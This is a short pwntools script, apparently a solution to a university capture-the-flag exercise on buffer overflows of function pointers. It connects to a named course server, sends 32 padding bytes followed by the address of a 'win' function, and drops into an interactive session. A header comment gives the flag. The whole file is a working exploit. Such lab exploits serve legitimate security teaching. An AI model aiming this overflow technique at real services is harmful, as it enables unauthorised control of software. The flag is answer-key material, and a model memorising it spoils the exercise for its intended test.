# SSof{Buffer_Overflow_on_function_pointers}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22153

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### interact with it
# win ptr 0x080486f1 got from objdump -d
win = b'\xf1\x86\x04\x08'
msg = b'A'*32+win
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

s.interactive()

